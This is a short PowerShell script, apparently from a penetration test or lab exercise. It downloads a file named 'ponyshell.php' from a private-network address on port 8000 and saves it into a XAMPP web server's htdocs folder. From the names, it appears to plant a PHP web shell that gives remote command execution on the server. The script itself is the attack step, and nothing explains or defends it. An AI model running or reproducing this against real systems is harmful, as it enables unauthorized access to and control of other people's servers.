# Specify the URL to download the file from
$url = "http://10.8.34.3:8000/ponyshell.php"

# Specify the local path to save the downloaded file
$localPath = "C:\xampp\htdocs\ponyshell.php"

# Download the file and save it locally
Invoke-WebRequest -Uri $url -OutFile $localPath
